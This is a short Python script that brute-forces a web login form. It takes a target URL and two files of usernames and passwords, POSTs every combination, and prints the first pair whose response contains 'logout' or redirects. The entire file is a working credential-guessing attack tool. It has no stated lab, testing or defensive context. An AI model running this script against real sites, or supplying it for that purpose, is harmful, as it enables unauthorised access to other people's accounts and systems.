import requests
from bs4 import BeautifulSoup

def attempt_login(url, username, password):
    data = {
        'username': username,
        'password': password
    }
    response = requests.post(url, data=data)
    return response

def read_file(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file]

def find_valid_credentials(url, usernames_file, passwords_file):
    usernames = read_file(usernames_file)
    passwords = read_file(passwords_file)

    for username in usernames:
        for password in passwords:
            response = attempt_login(url, username, password)
            # Update this condition to match the response indicating a successful login
            if "logout" in response.text.lower() or response.url != url:
                print(f'Valid credentials found: {username} / {password}')
                return username, password
    print('No valid credentials found')
    return None, None

if __name__ == '__main__':
    url = input('Enter the login URL: ')
    usernames_file = input('Enter the path to the usernames file: ')
    passwords_file = input('Enter the path to the passwords file: ')

    valid_username, valid_password = find_valid_credentials(url, usernames_file, passwords_file)

    if valid_username and valid_password:
        print(f'Valid credentials are {valid_username} / {valid_password}')
    else:
        print('No valid credentials were found')

